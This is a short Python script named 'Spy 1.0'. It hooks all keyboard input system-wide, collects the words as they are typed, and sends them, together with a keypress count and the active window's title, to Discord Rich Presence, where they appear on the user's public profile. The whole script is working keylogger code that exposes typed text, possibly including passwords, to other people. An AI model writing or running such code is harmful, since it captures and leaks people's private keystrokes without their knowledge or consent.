import keyboard
import time
import pypresence
import pygetwindow as gw
import os

client_id = "1078822767937458327"
RPC = pypresence.Presence(client_id)
RPC.connect()
os.system("mode con: cols=35 lines=10 && cls")
print("""
   ________  ________  ________ 
  /        \/        \/    /   \\
 /        _/         /         /
/-        /       __/\__      / 
\_______//\______/     \_____/  
                         v1.0
    Connected to Discord.
    """)

acc = ''
key_press_count = 0

start_time = time.time()

def on_press(event):
    global acc, key_press_count
    if event.name == 'backspace':
        acc = acc[:-1]
    elif event.name == 'space':
        acc = ''
    elif event.event_type == 'down' and len(event.name) == 1:
        acc += event.name
        key_press_count += 1
    active_window = gw.getActiveWindow()
    if active_window is not None:
        window_title = active_window.title
        RPC.update(
        details=f"Typed: {acc}",
        state=f"Times pressed: {key_press_count}", 
        large_image="guy",
        large_text="Spy 1.0",
        small_image="eye",
        small_text=f"{window_title}"
        )

keyboard.hook(on_press)

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        RPC.close()
        break
